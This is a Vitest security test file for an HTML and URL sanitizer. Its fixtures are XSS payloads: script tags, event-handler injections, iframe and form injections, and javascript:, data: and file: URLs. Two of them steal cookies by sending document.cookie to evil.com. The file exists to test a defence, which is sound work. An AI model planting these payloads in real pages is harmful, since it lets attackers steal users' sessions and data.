/**
 * Security Tests for HTML Sanitization
 *
 * CRITICAL: These tests protect against XSS attacks and code injection.
 * All tests must pass before deployment to production.
 *
 * Tests cover:
 * - XSS attack vectors (script injection, event handlers, etc.)
 * - Safe HTML preservation (formatting, links, etc.)
 * - URL validation (javascript:, data: URIs)
 * - Edge cases and malformed input
 */

import { describe, expect, it } from "vitest";
import {
  SANITIZE_PRESETS,
  sanitize,
  sanitizeHTML,
  sanitizeRichContent,
  sanitizeURL,
  sanitizeUserContent,
  stripHTML,
} from "../sanitize";

// ============================================================================
// XSS ATTACK PREVENTION TESTS
// ============================================================================

describe("sanitizeHTML - XSS Prevention", () => {
  describe("script injection attacks", () => {
    it("removes inline script tags", () => {
      const malicious = '<p>Safe text</p><script>alert("XSS")</script>';
      const result = sanitizeHTML(malicious);

      expect(result).toContain("Safe text");
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("alert");
    });

    it("removes script tags with attributes", () => {
      const malicious = '<script src="evil.js"></script><p>Text</p>';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("<script>");
      expect(result).not.toContain("evil.js");
    });

    it("removes inline scripts in various forms", () => {
      const attacks = [
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script   >alert('XSS')</script>",
      ];

      for (const attack of attacks) {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<script");
        expect(result).not.toContain("alert");
      }
    });
  });

  describe("event handler attacks", () => {
    it("removes onerror event handlers", () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')" />';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("onerror");
      expect(result).not.toContain("alert");
    });

    it("removes onload event handlers", () => {
      const malicious = '<body onload="alert(\'XSS\')">';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("onload");
      expect(result).not.toContain("alert");
    });

    it("removes onclick event handlers", () => {
      const malicious = '<a href="#" onclick="alert(\'XSS\')">Click</a>';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("onclick");
      expect(result).not.toContain("alert");
    });

    it("removes all dangerous event handlers", () => {
      const handlers = [
        "onclick",
        "onmouseover",
        "onmouseout",
        "onload",
        "onerror",
        "onfocus",
        "onblur",
      ];

      for (const handler of handlers) {
        const malicious = `<div ${handler}="alert('XSS')">Text</div>`;
        const result = sanitizeHTML(malicious);
        expect(result).not.toContain(handler);
      }
    });
  });

  describe("iframe and embed attacks", () => {
    it("removes iframe tags", () => {
      const malicious = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("<iframe");
      expect(result).not.toContain("evil.com");
    });

    it("removes object tags", () => {
      const malicious = '<object data="evil.swf"></object>';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("<object");
    });

    it("removes embed tags", () => {
      const malicious = '<embed src="evil.swf" />';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("<embed");
    });
  });

  describe("form injection attacks", () => {
    it("removes form tags", () => {
      const malicious = '<form action="https://evil.com"><input name="password"/></form>';
      const result = sanitizeHTML(malicious);

      expect(result).not.toContain("<form");
      expect(result).not.toContain("<input");
    });
  });
});

// ============================================================================
// SAFE HTML PRESERVATION
// ============================================================================

describe("sanitizeHTML - Safe Content Preservation", () => {
  describe("text formatting", () => {
    it("preserves paragraph tags", () => {
      const safe = "<p>This is a paragraph</p>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<p>");
      expect(result).toContain("This is a paragraph");
    });

    it("preserves strong tags", () => {
      const safe = "<strong>Bold text</strong>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<strong>");
      expect(result).toContain("Bold text");
    });

    it("preserves em tags", () => {
      const safe = "<em>Italic text</em>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<em>");
      expect(result).toContain("Italic text");
    });

    it("preserves line breaks", () => {
      const safe = "Line 1<br>Line 2";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<br");
    });
  });

  describe("links", () => {
    it("preserves safe links", () => {
      const safe = '<a href="https://example.com">Link</a>';
      const result = sanitizeHTML(safe);

      expect(result).toContain('<a href="https://example.com"');
      expect(result).toContain("Link");
    });

    it("preserves link title attribute", () => {
      const safe = '<a href="https://example.com" title="Example">Link</a>';
      const result = sanitizeHTML(safe);

      expect(result).toContain('title="Example"');
    });
  });

  describe("lists", () => {
    it("preserves unordered lists", () => {
      const safe = "<ul><li>Item 1</li><li>Item 2</li></ul>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<ul>");
      expect(result).toContain("<li>");
      expect(result).toContain("Item 1");
    });

    it("preserves ordered lists", () => {
      const safe = "<ol><li>First</li><li>Second</li></ol>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<ol>");
      expect(result).toContain("First");
    });
  });

  describe("headings", () => {
    it("preserves heading tags", () => {
      const headings = ["h1", "h2", "h3", "h4", "h5", "h6"];

      for (const tag of headings) {
        const safe = `<${tag}>Heading</${tag}>`;
        const result = sanitizeHTML(safe);
        expect(result).toContain(`<${tag}>`);
        expect(result).toContain("Heading");
      }
    });
  });

  describe("images", () => {
    it("preserves img tags with safe attributes", () => {
      const safe = '<img src="https://example.com/image.jpg" alt="Description" />';
      const result = sanitizeHTML(safe);

      expect(result).toContain("<img");
      expect(result).toContain('src="https://example.com/image.jpg"');
      expect(result).toContain('alt="Description"');
    });
  });

  describe("code blocks", () => {
    it("preserves code tags", () => {
      const safe = "<code>const x = 42;</code>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<code>");
      expect(result).toContain("const x = 42;");
    });

    it("preserves pre tags", () => {
      const safe = "<pre>Preformatted\n  text</pre>";
      const result = sanitizeHTML(safe);

      expect(result).toContain("<pre>");
      expect(result).toContain("Preformatted");
    });
  });

  describe("tables", () => {
    it("preserves table structure", () => {
      const safe = `
        <table>
          <thead>
            <tr><th>Header</th></tr>
          </thead>
          <tbody>
            <tr><td>Cell</td></tr>
          </tbody>
        </table>
      `;
      const result = sanitizeHTML(safe);

      expect(result).toContain("<table>");
      expect(result).toContain("<thead>");
      expect(result).toContain("<th>");
      expect(result).toContain("<tbody>");
      expect(result).toContain("<td>");
    });
  });
});

// ============================================================================
// RICH CONTENT SANITIZATION
// ============================================================================

describe("sanitizeRichContent", () => {
  it("allows video tags for admin content", () => {
    const content = '<video src="video.mp4" controls></video>';
    const result = sanitizeRichContent(content);

    expect(result).toContain("<video");
    expect(result).toContain("controls");
  });

  it("allows audio tags for admin content", () => {
    const content = '<audio src="audio.mp3" controls></audio>';
    const result = sanitizeRichContent(content);

    expect(result).toContain("<audio");
  });

  it("allows figure and figcaption", () => {
    const content = `
      <figure>
        <img src="image.jpg" alt="Image" />
        <figcaption>Caption</figcaption>
      </figure>
    `;
    const result = sanitizeRichContent(content);

    expect(result).toContain("<figure>");
    expect(result).toContain("<figcaption>");
  });

  it("still blocks dangerous content", () => {
    const malicious = '<script>alert("XSS")</script><p>Safe</p>';
    const result = sanitizeRichContent(malicious);

    expect(result).not.toContain("<script>");
    expect(result).toContain("Safe");
  });

  it("still blocks event handlers", () => {
    const malicious = '<p onclick="alert(\'XSS\')">Text</p>';
    const result = sanitizeRichContent(malicious);

    expect(result).not.toContain("onclick");
  });
});

// ============================================================================
// USER CONTENT SANITIZATION (Most Restrictive)
// ============================================================================

describe("sanitizeUserContent", () => {
  it("allows only basic formatting", () => {
    const content = "<p><strong>Bold</strong> and <em>italic</em> text</p>";
    const result = sanitizeUserContent(content);

    expect(result).toContain("<p>");
    expect(result).toContain("<strong>");
    expect(result).toContain("<em>");
  });

  it("removes images from user content", () => {
    const content = '<p>Text</p><img src="image.jpg" />';
    const result = sanitizeUserContent(content);

    expect(result).toContain("Text");
    expect(result).not.toContain("<img");
  });

  it("removes video from user content", () => {
    const content = '<p>Text</p><video src="video.mp4"></video>';
    const result = sanitizeUserContent(content);

    expect(result).not.toContain("<video");
  });

  it("removes tables from user content", () => {
    const content = "<table><tr><td>Cell</td></tr></table>";
    const result = sanitizeUserContent(content);

    expect(result).not.toContain("<table>");
  });

  it("preserves safe links", () => {
    const content = '<a href="https://example.com">Link</a>';
    const result = sanitizeUserContent(content);

    expect(result).toContain('<a href="https://example.com"');
  });

  it("removes headings from user content", () => {
    const content = "<h1>Heading</h1><p>Text</p>";
    const result = sanitizeUserContent(content);

    expect(result).not.toContain("<h1>");
    expect(result).toContain("Text");
  });
});

// ============================================================================
// STRIP HTML (Plain Text)
// ============================================================================

describe("stripHTML", () => {
  it("removes all HTML tags", () => {
    const content = "<p><strong>Bold</strong> text with <a href='#'>link</a></p>";
    const result = stripHTML(content);

    expect(result).not.toContain("<p>");
    expect(result).not.toContain("<strong>");
    expect(result).not.toContain("<a");
    expect(result).toBe("Bold text with link");
  });

  it("preserves text content", () => {
    const content = "<div><p>Hello <strong>World</strong>!</p></div>";
    const result = stripHTML(content);

    expect(result).toBe("Hello World!");
  });

  it("handles nested tags correctly", () => {
    const content = "<div><ul><li>Item 1</li><li>Item 2</li></ul></div>";
    const result = stripHTML(content);

    expect(result).toContain("Item 1");
    expect(result).toContain("Item 2");
    expect(result).not.toContain("<");
  });

  it("removes script tags but keeps text", () => {
    const content = '<p>Before</p><script>alert("XSS")</script><p>After</p>';
    const result = stripHTML(content);

    expect(result).toContain("Before");
    expect(result).toContain("After");
    expect(result).not.toContain("<");
  });
});

// ============================================================================
// URL SANITIZATION
// ============================================================================

describe("sanitizeURL", () => {
  describe("safe URLs", () => {
    it("allows https URLs", () => {
      expect(sanitizeURL("https://example.com")).toBe("https://example.com");
    });

    it("allows http URLs", () => {
      expect(sanitizeURL("http://example.com")).toBe("http://example.com");
    });

    it("allows mailto URLs", () => {
      expect(sanitizeURL("mailto:user@example.com")).toBe("mailto:user@example.com");
    });

    it("allows tel URLs", () => {
      expect(sanitizeURL("tel:+1234567890")).toBe("tel:+1234567890");
    });

    it("allows relative paths", () => {
      expect(sanitizeURL("/about")).toBe("/about");
      expect(sanitizeURL("/user/profile")).toBe("/user/profile");
    });
  });

  describe("automatic https prefix", () => {
    it("adds https:// to URLs without protocol", () => {
      expect(sanitizeURL("example.com")).toBe("https://example.com");
      expect(sanitizeURL("www.example.com")).toBe("https://www.example.com");
    });
  });

  describe("dangerous URL blocking", () => {
    it("blocks javascript: URLs", () => {
      expect(sanitizeURL("javascript:alert('XSS')")).toBe("");
      expect(sanitizeURL("JavaScript:alert('XSS')")).toBe("");
      expect(sanitizeURL("JAVASCRIPT:alert('XSS')")).toBe("");
    });

    it("blocks data: URLs", () => {
      expect(sanitizeURL("data:text/html,<script>alert('XSS')</script>")).toBe("");
      expect(sanitizeURL("DATA:text/html,malicious")).toBe("");
    });

    it("blocks vbscript: URLs", () => {
      expect(sanitizeURL("vbscript:alert('XSS')")).toBe("");
    });

    it("blocks file: URLs", () => {
      expect(sanitizeURL("file:///etc/passwd")).toBe("");
    });
  });

  describe("edge cases", () => {
    it("handles empty string", () => {
      expect(sanitizeURL("")).toBe("");
    });

    it("trims whitespace", () => {
      expect(sanitizeURL("  https://example.com  ")).toBe("https://example.com");
    });

    it("handles URLs with spaces", () => {
      const result = sanitizeURL(" example.com ");
      expect(result).toBe("https://example.com");
    });
  });
});

// ============================================================================
// SANITIZE PRESETS
// ============================================================================

describe("sanitize with presets", () => {
  it("uses DEFAULT preset", () => {
    const content = "<p>Text</p><script>alert('XSS')</script>";
    const result = sanitize(content, "DEFAULT");

    expect(result).toContain("<p>");
    expect(result).not.toContain("<script>");
  });

  it("uses USER_CONTENT preset", () => {
    const content = "<p>Text</p><img src='image.jpg' />";
    const result = sanitize(content, "USER_CONTENT");

    expect(result).toContain("<p>");
    expect(result).not.toContain("<img");
  });

  it("uses RICH_CONTENT preset", () => {
    const content = '<video src="video.mp4"></video>';
    const result = sanitize(content, "RICH_CONTENT");

    expect(result).toContain("<video");
  });

  it("uses PLAIN_TEXT preset", () => {
    const content = "<p><strong>Text</strong></p>";
    const result = sanitize(content, "PLAIN_TEXT");

    expect(result).toBe("Text");
  });

  it("defaults to DEFAULT preset when not specified", () => {
    const content = "<p>Text</p>";
    const result = sanitize(content);

    expect(result).toContain("<p>");
  });
});

// ============================================================================
// EDGE CASES & MALFORMED INPUT
// ============================================================================

describe("edge cases and malformed input", () => {
  it("handles empty string", () => {
    expect(sanitizeHTML("")).toBe("");
    expect(sanitizeUserContent("")).toBe("");
    expect(stripHTML("")).toBe("");
  });

  it("handles whitespace only", () => {
    expect(sanitizeHTML("   ")).toBe("   ");
  });

  it("handles unclosed tags", () => {
    const malformed = "<p>Text<strong>Bold";
    const result = sanitizeHTML(malformed);

    expect(result).toContain("Text");
    expect(result).toContain("Bold");
  });

  it("handles HTML entities", () => {
    const content = "<p>Price: &lt; $100 &amp; &gt; $50</p>";
    const result = sanitizeHTML(content);

    expect(result).toContain("&lt;");
    expect(result).toContain("&gt;");
    expect(result).toContain("&amp;");
  });

  it("handles deeply nested tags", () => {
    const content = "<div><div><div><div><p>Deep</p></div></div></div></div>";
    const result = sanitizeHTML(content);

    expect(result).toContain("Deep");
  });

  it("handles very long strings", () => {
    const longContent = "<p>" + "a".repeat(10000) + "</p>";
    const result = sanitizeHTML(longContent);

    expect(result).toContain("<p>");
    expect(result.length).toBeGreaterThan(10000);
  });
});

// ============================================================================
// REAL-WORLD ATTACK SCENARIOS
// ============================================================================

describe("real-world XSS attack scenarios", () => {
  it("prevents stored XSS in user reviews", () => {
    const maliciousReview = `
      Great service! 5 stars!
      <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
    `;
    const result = sanitizeUserContent(maliciousReview);

    expect(result).toContain("Great service");
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("fetch");
    expect(result).not.toContain("<img");
  });

  it("prevents DOM-based XSS via innerHTML", () => {
    const malicious = "<img src=x onerror=this.src='https://evil.com/'+document.cookie>";
    const result = sanitizeHTML(malicious);

    expect(result).not.toContain("onerror");
  });

  it("prevents XSS via SVG", () => {
    const malicious = '<svg onload="alert(\'XSS\')"></svg>';
    const result = sanitizeHTML(malicious);

    expect(result).not.toContain("onload");
  });

  it("prevents XSS via style attribute", () => {
    const malicious = '<p style="background: url(javascript:alert(\'XSS\'))">Text</p>';
    const result = sanitizeHTML(malicious);

    // DOMPurify should handle style attributes
    expect(result).not.toContain("javascript:");
  });
});
